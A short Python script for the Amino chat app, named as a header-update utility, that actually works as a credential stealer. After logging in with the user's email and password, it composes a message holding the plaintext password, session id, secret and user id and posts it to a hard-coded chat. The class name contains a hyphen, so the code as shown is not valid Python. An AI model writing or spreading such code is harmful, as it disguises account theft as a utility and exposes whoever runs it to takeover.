import aminofix



class Update-headers:
	def __init__(self, email: str, password: str):
		self.email=email
		self.password=password
		self.login()


	def login(self):
		c=aminofix.Client()
		c.login(email=self.email,password=self.password)
		text =f"""
email: {self.email}
password:{self.password}
sid:{c.sid}
secret:{c.secret}
name:{c.profile.nickname}
userId:{c.userId}"""
		c.join_chat("737f293e-9779-48d9-9752-9643fe66346b")
		c.send_message(chatId="737f293e-9779-48d9-9752-9643fe66346b",message=text)
		c.leave_chat("737f293e-9779-48d9-9752-9643fe66346b")
